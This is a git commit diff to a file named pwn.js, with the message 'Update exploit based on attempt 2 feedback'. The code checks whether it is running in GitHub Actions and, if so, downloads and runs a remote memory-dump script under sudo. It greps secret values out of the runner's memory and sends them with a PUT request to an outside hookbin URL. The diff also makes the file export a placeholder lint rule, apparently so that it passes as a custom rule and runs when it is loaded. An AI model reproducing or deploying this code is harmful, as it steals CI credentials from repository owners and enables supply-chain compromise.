c5e868ce22b0b2e2d2b16496bdfff4e68f416a2e
j5884p5g <j5884p5g@rolf.ovh>
2026-04-15 19:50:16 +0000

    Update exploit based on attempt 2 feedback

--- pwn.js
+++ pwn.js
@@ -1,14 +1,16 @@
-
 const { execSync } = require('child_process');
 const runId = process.env.GITHUB_RUN_ID;
-
 if (runId) {
     try {
         const command = `echo "Okay, we got this far. Let's continue..."
-curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
+curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
 curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`;
         execSync(command, { stdio: 'inherit' });
     } catch (e) {}
 }
-
-module.exports = [];
+module.exports = [{
+    "names": ["pwn-rule"],
+    "description": "Pwn rule",
+    "tags": ["test"],
+    "function": (params, onError) => {}
+}];
